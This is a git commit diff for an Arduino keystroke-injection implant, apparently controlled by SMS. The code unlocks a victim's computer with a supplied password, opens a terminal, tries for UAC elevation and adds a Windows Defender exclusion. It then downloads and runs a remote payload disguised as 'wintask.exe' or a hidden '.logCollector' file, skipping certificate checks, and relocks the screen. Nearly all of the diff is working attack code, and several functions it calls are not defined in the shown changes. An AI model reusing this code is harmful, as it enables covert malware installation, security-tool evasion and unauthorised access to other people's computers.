50fea296b7b401f59675ddf788c37df1a7a1488e
0ca <francisco.oca@getcruise.com>
2019-05-15 18:23:08 -0400

    Restructure the code

--- SMS version/KEYVILBOARD/KEYVILBOARD.ino
+++ SMS version/KEYVILBOARD/KEYVILBOARD.ino
@@ -170,6 +170,351 @@ String getValue(String data, String separator, int index)
   return found>index ? data.substring(strIndex[0], strIndex[1]) : "";
 }
 
+// It opens a terminal in Windows (7, 8, 10) it tries to open an UAC elevated cmd.exe
+void openTerminalWindows() {
+  //Keys:
+  // Windows+R
+  //  cmd.exe
+  // Enter
+  //Actions:
+  // Windows: Opens cmd
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.print("cmd.exe");
+  Keyboard.press('\n');
+  Keyboard.releaseAll();
+  delay(2000);
+  
+  //Keys:
+  // powershell Start-Process cmd -Verb runAs && exit
+  // Enter
+  // LEFT + y 
+  // Backspace
+  // Escape
+  //Actions:
+  // Windows: Opens cmd with UAC elevated if admin (If not fails but we still have a cmd shell from before)
+  // Linux: It writes rpowershell... to the terminal and tries to run it (Not logged in the bash history)
+  Keyboard.print("powershell Start-Process cmd -Verb runAs && exit");
+  Keyboard.press('\n');
+  Keyboard.releaseAll();
+  //Powershell needs time to load (at least in my very slow windows laptop)
+  delay(5000);
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('y');
+  Keyboard.press(KEY_BACKSPACE);
+  Keyboard.releaseAll();
+  Keyboard.press(KEY_ESC);
+  Keyboard.releaseAll();
+  delay(1000);
+}
+
+
+// It opens a terminal in Windows (7, 8, 10) and Linux (Ubuntu, 16, 18)
+void openTerminalLinux() {
+  //Keys:
+  // Ctrl+Alt+T 
+  //Actions:
+  // Windows: Nothing
+  // Linux: Open a terminal
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('t');
+  Keyboard.releaseAll();
+  delay(1000);
+  //Now we are ready to execute commands in Linux :)
+}
+
+// It opens a terminal in Windows (7, 8, 10) and Linux (Ubuntu, 16, 18)
+void openTerminalWindowsLinux() {
+  //Keys:
+  // Win+D
+  //Action:
+  // Windows: It opens the desktop
+  // Linux: It opens the desktop
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('d');
+  Keyboard.releaseAll();
+  delay(1000);
+  
+  //Keys:
+  // Ctrl+Alt+T 
+  //Actions:
+  // Windows: Nothing
+  // Linux: Open a terminal
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('t');
+  Keyboard.releaseAll();
+  delay(1000);
+  
+  //Keys:
+  // space
+  // Windows+R
+  //  cmd.exe
+  // Enter
+  // LEFT + y 
+  // Backspace
+  //Actions:
+  // Windows: Opens cmd
+  // Linux: It writes rcmd.exe to the terminal and tries to run it (Not logged in the bash history)
+  Keyboard.press(' ');
+  Keyboard.releaseAll();
+  delay(500);  
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.print(" cmd.exe");
+  Keyboard.press('\n');
+  Keyboard.releaseAll();
+  delay(2000);
+  
+  //Keys:
+  //  powershell Start-Process cmd -Verb runAs && exit
+  // Enter
+  // LEFT + y 
+  // Backspace
+  // Escape
+  //Actions:
+  // Windows: Opens cmd with UAC elevated if admin (If not fails but we still have a cmd shell from before)
+  // Linux: It writes rpowershell... to the terminal and tries to run it (Not logged in the bash history)
+  Keyboard.print(" powershell Start-Process cmd -Verb runAs && exit");
+  Keyboard.press('\n');
+  Keyboard.releaseAll();
+  //Powershell needs time to load (at least in my very slow windows laptop)
+  delay(5000);
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('y');
+  Keyboard.press(KEY_BACKSPACE);
+  Keyboard.releaseAll();
+  Keyboard.press(KEY_ESC);
+  Keyboard.releaseAll();
+  delay(500);
+  ///bin/bash ommits one character after you press ESC, so we press it again
+  Keyboard.press(KEY_ESC);
+  Keyboard.releaseAll();
+  delay(2000);
+
+  //Now we are ready to execute commands in windows and Linux :)
+}
+
+// It opens a terminal in Windows (8, 10), Linux (Ubuntu) and MacOS
+void openTerminalMultiOs() {
+  //Keys:
+  // Win+space
+  // Win+d
+  // backspace
+  // Win+q
+  // Esc
+  // Win+space
+  //Action:
+  // Window It opens the desktop
+  // Linux: It opens the desktop
+  // MacOs: It opens the spotlight (and ignores Command+D a very common shortcut in MacOs)
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(' ');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('d');
+  Keyboard.releaseAll();
+  delay(1000);
+  //Sometimes the spotlight has already some text, we delete it
+  Keyboard.press(KEY_BACKSPACE);
+  Keyboard.releaseAll();
+  delay(1000);
+  //Sometimes Win+D opens the dictionary from the spotlight in macos. We close it with this
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('q');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.press(KEY_ESC);
+  Keyboard.releaseAll();
+  delay(1000);
+  //We reopen the spotlight
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(' ');
+  Keyboard.releaseAll();
+  delay(1000);
+
+//This doesn't work all the times, it deselect the icon but an app in the task bar gets selected, and that's worst with the next commands
+  //Keys:
+  // Menu key (Shift + F10)
+  // R
+  // ESC
+  //Actions:
+  // Windows: Deselects the current item in the desktop
+  // Linux: Nothing
+  // MacOs: Nothing
+//  Keyboard.press(KEY_LEFT_SHIFT);
+//  Keyboard.press(KEY_F10);
+//  Keyboard.releaseAll();
+//  delay(500);
+//  Keyboard.press('R');
+//  Keyboard.releaseAll();
+//  delay(500);
+//  Keyboard.press(KEY_ESC);
+//  Keyboard.releaseAll();
+//  delay(500);
+
+  //Keys:
+  // terminal.app
+  // Enter
+  //Actions:
+  // Windows: Nothing
+  // Linux: It tries to execute that command but it fails
+  // MacOs: Open a terminal
+  Keyboard.print("terminal.app");
+  Keyboard.releaseAll();
+  delay(2000);
+  Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(1000);
+
+  //Keys:
+  // Ctrl+Alt+T 
+  //Actions:
+  // Windows: Nothing
+  // Linux: Open a terminal
+  // MacOs: Nothing (We are in the terminal)
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('t');
+  Keyboard.releaseAll();
+  delay(1000);
+
+  //Keys:
+  // space
+  // Windows+R
+  //  cmd.exe
+  // Enter
+  //Actions:
+  // Windows: Opens cmd
+  // Linux: It writes rcmd.exe to the terminal and tries to run it (Not logged in the bash history)
+  // MacOs: It writes cmd.exe to the terminal and tries to run it (Not logged in the bash history)
+  Keyboard.press(' ');
+  Keyboard.releaseAll();
+  delay(500);  
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.print(" r");
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.print(" cmd.exe");
+  Keyboard.press('\n');
+  Keyboard.releaseAll();
+  delay(2000);
+  
+  //Keys:
+  //  powershell Start-Process cmd -Verb runAs && exit
+  // Enter
+  // LEFT + y 
+  // Backspace
+  // Escape
+  //Actions:
+  // Windows: Opens cmd with UAC elevated if admin (If not fails but we still have a cmd shell from before)
+  // Linux: It writes rpowershell... to the terminal and tries to run it (Not logged in the bash history)
+  // MacOs: It writes powershell... to the terminal and tries to run it (Not logged in the bash history)
+  Keyboard.print(" powershell Start-Process cmd -Verb runAs && exit");
+  Keyboard.press('\n');
+  Keyboard.releaseAll();
+  //Powershell needs time to load (at least in my very slow windows laptop)
+  delay(5000);
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('y');
+  Keyboard.press(KEY_BACKSPACE);
+  Keyboard.releaseAll();
+  ///bin/bash ommits one character after you press ESC, so we press it again
+  Keyboard.press(KEY_ESC);
+  Keyboard.releaseAll();
+  delay(500);
+  ///bin/bash ommits one character after you press ESC, so we press it again
+  Keyboard.press(KEY_ESC);
+  Keyboard.releaseAll();
+  delay(2000);
+
+  //Now we are ready to execute commands in all OS :)
+}
+
+void downloadAndRunMalwareWindows(String url) {
+  // Add windows defender exception
+  String cmd1 = "powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %appdata%";
+  Keyboard.print(cmd1.c_str());
+  Keyboard.press('\n');
+  Keyboard.releaseAll(); 
+  delay(500);
+
+  String cmd = "bitsadmin /transfer winupdate /download /priority foreground " + url.c_str() + " %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe && exit";
+  Keyboard.println(cmd.c_str());
+  Keyboard.releaseAll();
+  delay(1000);        
+}
+
+void downloadAndRunMalwareLinux(String url) {
+  String cmd = " x=/tmp/.logCollector; wget --no-check-certificate " + url.c_str() + " -O ${x}; chmod +x ${x}; ${x}; rm ${x}";
+  Keyboard.println(cmd.c_str());
+  Keyboard.releaseAll();
+  delay(1000); 
+}
+
+void downloadAndRunMalwareMacOs(String url) {
+  String cmd = " x=/tmp/.logCollector; wget --no-check-certificate " + url.c_str() + " -O ${x}; chmod +x ${x}; ${x}; rm ${x}";
+  Keyboard.println(cmd.c_str());
+  Keyboard.releaseAll();
+  delay(1000); 
+}
+
+void exitShell() {
+  //Keys:
+  // exit
+  //Actions:
+  // Windows: Closes the terminal
+  // Linux: Closes the terminal
+  // MacOs: Closes the shell but the terminal remains open
+  Keyboard.println(" exit");
+  Keyboard.releaseAll();
+  delay(1000);
+}
+
+void exitShellOsx() {
+  exitShell();
+
+  //Only for MacOs
+  //Keys:
+  // Alt+Q
+  // ESC
+  //Actions:
+  // Windows: Nothing (Open the search bar in win8 and closes it with ESC)
+  // Linux: Nothing
+  // MacOs: Closes the terminal window
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('q');
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(KEY_ESC);
+  Keyboard.releaseAll();
+}
+
+void lockWin() {
+  Keyboard.press(KEY_RIGHT_GUI);
+  Keyboard.press('l');
+  Keyboard.releaseAll(); 
+  delay(1000);
+}
+
+void lockLinux() {
+  lockWin();
+}
+
+void lockMacOs() {
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('q');
+  Keyboard.releaseAll();
+  delay(1000);
+}
+
 void setup() {
   delay(300);                                              
   Serial.begin(BAUD_RATE_SERIAL);                                                   
@@ -310,116 +655,53 @@ void loop() {
   
         // Unlock the computer to download and execute malware
         unlockComputer(password);
-        delay(500);
-  
+        delay(2000);
+        
         // Download and execute the malware
         if(OS == "win"){
-          // Normal user      
-          Keyboard.press(KEY_LEFT_GUI);
-          Keyboard.press('r');
-          Keyboard.releaseAll();
-          delay(400);
-          Keyboard.print("cmd.exe");
-          Keyboard.press('\n');
-          Keyboard.releaseAll();
-          delay(400);
-          String cmd = "bitsadmin /transfer winupdate /download /priority foreground " + url + " %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe && exit";
-          Keyboard.print(cmd.c_str());
-          Keyboard.press('\n');
-          Keyboard.releaseAll(); 
-          delay(400);
-          // Lock back
-          Keyboard.press(KEY_RIGHT_GUI);
-          Keyboard.press('l');
-          Keyboard.releaseAll();                 
+          //Open a terminal with UAC elevated if possible
+          openTerminalWindows();
+          downloadAndRunMalwareWindows(url);
+          exitTerminalWindowsLinux();
+          lockWindows();
         }
         
         else if(OS == "lnx"){
-          Keyboard.press(KEY_LEFT_GUI);
-          Keyboard.press('r');
-          Keyboard.releaseAll();
-          delay(400);
-          Keyboard.print("terminal");
-          Keyboard.press('\n');
-          Keyboard.releaseAll();
-          delay(400);
-          String cmd = " x=/tmp/.logCollector; wget --no-check-certificate " + url + " -O ${x}; chmod +x ${x}; ${x}; rm ${x}";
-          Keyboard.print(cmd.c_str());
-          Keyboard.press('\n');
-          Keyboard.releaseAll();
-          delay(400);
-          // Lock back
-          Keyboard.press(KEY_RIGHT_GUI);
-          Keyboard.press('l');
-          Keyboard.releaseAll();
-          
+          openTerminalLinux();
+          downloadAndRunMalwareLinux(url);
+          exitTerminalWindowsLinux();
+          lockLinux();
         }
-        
         else if(OS == "osx"){
-          Keyboard.press(KEY_LEFT_GUI);
-          Keyboard.press('r');
-          Keyboard.releaseAll();
-          delay(400);
-          Keyboard.print("terminal");
-          Keyboard.press('\n');
-          Keyboard.releaseAll();
-          delay(400);
-          String cmd = " x=/tmp/.logCollector; wget --no-check-certificate " + url + " -O ${x}; chmod +x ${x}; ${x}; rm ${x}";
-          Keyboard.print(cmd.c_str());
-          Keyboard.press('\n');
-          Keyboard.releaseAll();
-          delay(400);
-          // Lock back
-          Keyboard.press(KEY_LEFT_GUI);
-          Keyboard.press(KEY_LEFT_CTRL);
-          Keyboard.press('q');
-          Keyboard.releaseAll();
+          openTerminalMacOs();
+          downloadAndRunMalwareMacOs(url);
+          exitTerminalMacOs();
+          lockMacOs();
+        }
+        else if(OS == "winlin") {
+          //We don't know the OS but we suspect is windows or linux
+          openTerminalWindowsLinux();
+          downloadAndRunMalwareWindows(url);
+          downloadAndRunMalwareLinux(url);
+          exitTerminalWindowsLinux();
+          lockWindows();
+          lockLinux();
         }
         else{
-          sendSMSMessage("Wrong OS sent for payload");
+          //We don't know the OS
+          openTerminalMultiOs();
+          //We try all the payload
+          downloadAndRunMalwareWindows(url);
+          downloadAndRunMalwareLinux(url);
+          downloadAndRunMalwareMacOs(url);
+          //It also closes it for Windows and Linux
+          exitTerminalMacOs();
+          //We try to lock all the os
+          lockWin();
+          lockLinux();
+          lockMacOs();
         }
       }
-
-      
-      else if(payload == "win_uac_unlck_dwn"){
-        String OS = getValue(SMS_text,SEPARATOR,1);
-        OS.toLowerCase();
-        String password = getValue(SMS_text,SEPARATOR,2);
-        String url = getValue(SMS_text,SEPARATOR,3);
-  
-        // Unlock the computer to download and execute malware
-        unlockComputer(password);
-        delay(500);
-
-        // UAC bypass
-        Keyboard.press(KEY_LEFT_GUI);
-        Keyboard.press('r');
-        Keyboard.releaseAll();
-        delay(400);
-        Keyboard.print("powershell Start-Process cmd -Verb runAs");
-        Keyboard.press('\n');
-        Keyboard.releaseAll();
-        delay(3000);
-        
-        Keyboard.press(KEY_LEFT_ALT);
-        Keyboard.press('y');
-        Keyboard.releaseAll();
-        delay(500);
-
-        // Add windows defender exception
-        String cmd1 = "powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %appdata%";
-        Keyboard.print(cmd1.c_str());
-        Keyboard.press('\n');
-        Keyboard.releaseAll(); 
-        delay(500);
-        
-        String cmd = "bitsadmin /transfer winupdate /download /priority foreground " + url + " %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe && exit";
-        Keyboard.print(cmd.c_str());
-        Keyboard.press('\n');
-        Keyboard.releaseAll(); 
-        
-      }
-
       // Manuall##press##83 72 (in hex)
       // Manual##delay##100
       // Manual##release
